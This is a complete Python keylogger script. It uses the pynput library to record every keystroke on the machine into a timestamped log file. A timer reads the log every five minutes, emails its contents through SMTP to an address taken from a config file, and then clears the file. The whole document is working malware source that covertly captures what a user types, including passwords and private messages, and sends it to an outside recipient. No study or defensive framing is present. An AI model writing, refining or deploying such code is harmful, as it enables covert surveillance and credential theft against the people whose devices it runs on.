from pynput import keyboard
import smtplib
import os
import time
import logging
from threading import Timer
from datetime import datetime
import config

# Logging configuration
log_filename = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Key press event
def on_press(key):
    try:
        logging.info(f"Key: {key.char}")
    except AttributeError:
        logging.info(f"Special Key: {key}")

# Email sending function
def send_email():
    try:
        with open(log_filename, "r") as file:
            log_data = file.read()

        subject = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        message = f"Subject: {subject}\n\n{log_data}"

        with smtplib.SMTP(config.SMTP_SERVER, config.SMTP_PORT) as server:
            server.starttls()
            server.login(config.EMAIL_ADDRESS, config.EMAIL_PASSWORD)
            server.sendmail(config.EMAIL_ADDRESS, config.TO_EMAIL, message)

        # Clear file after sending
        open(log_filename, "w").close()

    except Exception as e:
        logging.error(f"Email failed: {e}")

    # Schedule next send
    Timer(300, send_email).start()  # Send every 5 minutes

# Start keylogger and email timer
send_email()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
